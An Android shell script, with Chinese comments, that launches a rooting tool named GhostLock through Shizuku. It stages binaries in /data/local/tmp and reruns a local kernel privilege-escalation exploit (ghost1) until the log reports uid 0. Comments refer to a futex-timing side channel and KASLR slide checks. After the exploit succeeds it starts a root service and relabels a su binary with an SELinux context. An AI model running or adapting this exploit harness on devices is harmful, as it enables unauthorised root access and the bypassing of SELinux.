#!/system/bin/sh
# GhostLock 管理器：经 Shizuku(shell) 启动 root
# 参数 $1 = 本脚本所在目录（/sdcard/Android/data/<pkg>/files/ghost）
SRC="$1"
TMP=/data/local/tmp
[ -d "$SRC" ] || { echo "ERR staged dir missing: $SRC"; exit 2; }
cd "$TMP" || exit 3

for f in ghost1 glsrv gl-su; do
  if [ ! -f "$TMP/$f" ] || [ "$(md5sum "$TMP/$f" 2>/dev/null | awk '{print $1}')" != "$(md5sum "$SRC/$f" 2>/dev/null | awk '{print $1}')" ]; then
    cp "$SRC/$f" "$TMP/$f" || { echo "ERR copy $f"; exit 4; }
  fi
done
chmod 755 "$TMP/ghost1" "$TMP/glsrv" "$TMP/gl-su"

# keyring 权限对比探针（Shizuku shell 环境，供排查/回归）
[ -x "$TMP/keyprobe" ] && "$TMP/keyprobe" > "$TMP/keyprobe_shizuku.txt" 2>&1

if pidof glsrv >/dev/null 2>&1; then
  echo "SERVICE_ALREADY"
  echo "setlabel $TMP/gl-su u:object_r:shell_exec:s0" > "$TMP/ghost_cmd"
  sleep 1
  echo "ROOT_READY"
  exit 0
fi

# 等触摸/UI 触发的 CPU boost 衰减：KernelSnitch 的空 futex 计时会被高频压到
# 时钟量化以下（t_empty=0），脚本判据会直接 REJECT。
echo "settle 8s before exploit..."
sleep 8

attempt=0
ok=0
while [ $attempt -lt 6 ]; do
  attempt=$((attempt+1))
  rm -f "$TMP/rt.log"
  (cd "$TMP" && setsid ./ghost1 root > "$TMP/rt.log" 2>&1 < /dev/null) &
  pid=$!
  n=0
  while [ $n -lt 120 ]; do
    sleep 1
    n=$((n+1))
    if grep -q "\[rt\] FINAL uid=0" "$TMP/rt.log" 2>/dev/null; then ok=1; break; fi
    if grep -q -E "RT_FAIL|BAD slide|REJECT" "$TMP/rt.log" 2>/dev/null; then break; fi
    if ! kill -0 "$pid" 2>/dev/null && [ $n -gt 5 ]; then break; fi
  done
  cp -f "$TMP/rt.log" "$TMP/rt_att$attempt.log" 2>/dev/null
  [ $ok -eq 1 ] && break
  sleep 3
done
if [ $ok -ne 1 ]; then
  echo "ERR exploit failed after $attempt attempts"
  grep -E "\[ks\]|\[leak\]|RT_FAIL|BAD|REJECT" "$TMP/rt.log" 2>/dev/null | tail -n 20
  tail -n 20 "$TMP/rt.log" 2>/dev/null
  exit 5
fi

# setcon adbd 偶发瞬时 EACCES（状态重校验），重试一次
echo serve > "$TMP/ghost_cmd"
sleep 2
if ! pidof glsrv >/dev/null 2>&1; then
  echo "retry serve..."
  echo serve > "$TMP/ghost_cmd"
  sleep 2
fi
if pidof glsrv >/dev/null 2>&1; then
  echo "ROOT_READY"
  # 服务起来后再打标签：早写会被后续 serve 覆盖，且那时 broker 还没开始轮询
  echo "setlabel $TMP/gl-su u:object_r:shell_exec:s0" > "$TMP/ghost_cmd"
  sleep 1
  tail -n 2 "$TMP/ghost_out" 2>/dev/null
  exit 0
fi
echo "ERR service not started"
grep "\[SV\]" "$TMP/prog.log" 2>/dev/null | tail -n 6
tail -n 10 "$TMP/prog.log" 2>/dev/null
exit 6